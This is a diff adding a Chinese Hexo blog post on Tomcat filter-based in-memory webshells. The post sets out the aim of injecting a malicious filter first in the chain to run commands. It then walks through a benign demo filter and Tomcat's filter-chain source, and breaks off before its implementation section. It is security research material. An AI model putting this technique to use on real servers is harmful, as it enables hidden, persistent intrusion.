@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Filter内存马 从图中可以看出，我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell   环境配置 首先在IDEA中创建Servlet，并导入tomcat依赖   Tomcat 8.5.76">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Filter内存马">
+<meta property="og:url" content="http://curlysean.github.io/2025/03/20/Filter%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="肖恩的博客">
+<meta property="og:description" content="Filter内存马 从图中可以看出，我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell   环境配置 首先在IDEA中创建Servlet，并导入tomcat依赖   Tomcat 8.5.76">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739971340388-3ad6b685-a309-48d8-a9c8-8aec01b51498.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739972523121-b4c3ebbc-9779-433c-894e-4e50321f0ec9.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739974979952-7621ab1b-ae28-422f-b56e-2383039abd99.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739975105993-2fd6a174-e712-4a6f-8c93-f10276349fbb.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739973063712-75d8dbd2-840b-4511-8723-5c39536be414.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739973469688-422a88fc-fcad-42a8-8f4a-e55a59abcd7e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739974131159-d7c2321f-3fbd-476e-8f88-3ba2bc9427d4.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740022403092-db28fc42-94a7-4919-9ec1-a405edd7079d.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740024176570-94403153-3034-4c3f-9c3e-fe9b5dbb800c.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740024260413-8f70c49f-e9ef-4c05-96bd-98bebce1d826.png">
+<meta property="article:published_time" content="2025-03-20T06:28:59.250Z">
+<meta property="article:modified_time" content="2025-03-20T06:30:53.211Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="memShell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739971340388-3ad6b685-a309-48d8-a9c8-8aec01b51498.png">
+
+
+<link rel="canonical" href="http://curlysean.github.io/2025/03/20/Filter%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://curlysean.github.io/2025/03/20/Filter%E5%86%85%E5%AD%98%E9%A9%AC/","path":"2025/03/20/Filter内存马/","title":"Filter内存马"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Filter内存马 | 肖恩的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">肖恩的博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cia0D"><span class="nav-number">1.</span> <span class="nav-text">Filter内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#bewEJ"><span class="nav-number">1.1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hor2T"><span class="nav-number">1.2.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bXsSe"><span class="nav-number">1.2.1.</span> <span class="nav-text">访问&#x2F;filter后</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SZLEc"><span class="nav-number">1.2.2.</span> <span class="nav-text">访问&#x2F;filter前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#obF3g"><span class="nav-number">1.2.3.</span> <span class="nav-text">小结流程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Bwlh4"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">执行invoke方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SH7Hi"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">拿出filterchain</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WnYOh"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">最后一个filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#qrB6I"><span class="nav-number">1.2.3.4.</span> <span class="nav-text">攻击思路</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OnoJl"><span class="nav-number">1.2.4.</span> <span class="nav-text">思路分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AFHVe"><span class="nav-number">1.3.</span> <span class="nav-text">实现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#l8hXT"><span class="nav-number">1.3.1.</span> <span class="nav-text">构造思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RXwTZ"><span class="nav-number">1.3.2.</span> <span class="nav-text">filter内存马的实现</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Sean</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/03/20/Filter%E5%86%85%E5%AD%98%E9%A9%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Sean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Filter内存马 | 肖恩的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Filter内存马
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-03-20 14:28:59 / 修改时间：14:30:53" itemprop="dateCreated datePublished" datetime="2025-03-20T14:28:59+08:00">2025-03-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="cia0D">Filter内存马</h1>
+<font style="color:rgb(80, 80, 92);">从图中可以看出，我们的请求会经过 filter 之后才会到 Servlet ，那么如果我们动态创建一个 filter 并且将其放在最前面，我们的 filter 就会最先执行，当我们在 filter 中添加恶意代码，就会进行命令执行，这样也就成为了一个内存 Webshell</font>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739971340388-3ad6b685-a309-48d8-a9c8-8aec01b51498.png"></p>
+<h2 id="bewEJ">环境配置</h2>
+<font style="color:rgb(80, 80, 92);">首先在IDEA中创建Servlet，并导入tomcat依赖</font>
+
+<ul>
+<li>Tomcat 8.5.76</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">8.5</span><span class="number">.81</span>&lt;/version&gt;  </span><br><span class="line"> &lt;scope&gt;provided&lt;/scope&gt;  </span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在我们的项目中构造一个Filter类<code>memFilter</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">memFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter success&quot;</span>);</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改web.xml，将该filter与路径绑定，即只有访问&#x2F;filter时才会触发filter拦截器</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;web-app xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="line">         version=<span class="string">&quot;4.0&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;filter&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;memFilter&lt;/filter-class&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;filter&lt;/filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="hor2T">分析</h2>
+<h3 id="bXsSe">访问/filter后</h3>
+<font style="color:rgb(80, 80, 92);">我们在 filter.java 下的 doFilter 这个地方打断点，并且访问 /filter 接口，断下来开始调试</font>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1739972523121-b4c3ebbc-9779-433c-894e-4e50321f0ec9.png"></p>
+<p>步入<code>ApplicationFilterChain#doFilter</code>，<code>Globals.IS_SECURITY_ENABLED </code>用来判断一下是否开启全局服务，默认不开启</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.AccessController.doPrivileged(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">                            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                            internalDoFilter(req,res);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                );</span><br><span class="line">            &#125; <span class="keyword">catch</span>( PrivilegedActionException pe) &#123;</span><br><span class="line">                <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> pe.getException();</span><br><span class="line">                <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ServletException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (ServletException) e;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> IOException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (IOException) e;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (RuntimeException) e;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(e.getMessage(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            internalDoFilter(request,response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跳到最后的else中，进入到<code>internalDoFilter</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">                                  ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="string">&quot;false&quot;</span>.equalsIgnoreCase(</span><br><span class="line">                        filterConfig.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span></span><br><span class="line">                        ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line"></span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req, res, <span class="built_in">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege (<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filter.doFilter(request, response, <span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">                ExceptionUtils.handleThrowable(e);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.filter&quot;</span>), e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// We fell off the end of the chain -- call the servlet instance</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">                lastServicedRequest.set(request);</span><br><span class="line">                lastServicedResponse.set(response);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123;</span><br><span class="line">                request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,</span><br><span class="line">                        Boolean.FALSE);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Use potentially wrapped request from this point</span></span><br><span class="line">            <span class="keyword">if</span> ((request <span class="keyword">instanceof</span> HttpServletRequest) &amp;&amp;</span><br><span class="line">                    (response <span class="keyword">instanceof</span> HttpServletResponse) &amp;&amp;</span><br><span class="line">                    Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">                <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span></span><br><span class="line">                    ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line">                Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req, res&#125;;</span><br><span class="line">                SecurityUtil.doAsPrivilege(<span class="string">&quot;service&quot;</span>,</span><br><span class="line">                                           servlet,</span><br><span class="line">                                           classTypeUsedInService,</span><br><span class="line">                                           args,</span><br><span class="line">                                           principal);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                servlet.service(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ServletException | RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e = ExceptionUtils.unwrapInvocationTargetException(e);</span><br><span class="line">            ExceptionUtils.handleThrowable(e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(sm.getString(<span class="string">&quot;filterChain.servlet&quot;</span>), e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>);</span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>filter是从filters[pos++]中获取的，其中定义如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ApplicationFilterConfig[] filters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>
+
+<p>filters其中存在两个filter，一个是tomcat本身自带的，另一个就是我们所定义的</p>
+<blockquote>
